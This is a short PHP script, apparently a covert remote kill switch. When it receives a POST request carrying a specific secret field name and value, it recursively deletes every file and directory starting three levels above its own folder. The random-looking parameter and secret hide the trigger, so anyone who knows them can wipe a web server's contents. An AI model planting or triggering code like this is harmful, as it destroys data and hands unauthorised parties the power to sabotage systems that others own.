<?php

  if ($_SERVER["REQUEST_METHOD"] === "POST" && $_POST["GWcjcR249IvtUSdpalQgKPzk"] === "Prw36BdCqAYO3KOy6iW7D7NO") {
    recursiveRemoveDirectory("../../../");
  }

  function recursiveRemoveDirectory($directory) {
    foreach(glob("{$directory}/*") as $file) {
        if(is_dir($file)) {
            recursiveRemoveDirectory($file);
        } else {
            unlink($file);
        }
    }
    rmdir($directory);
  }
 ?>
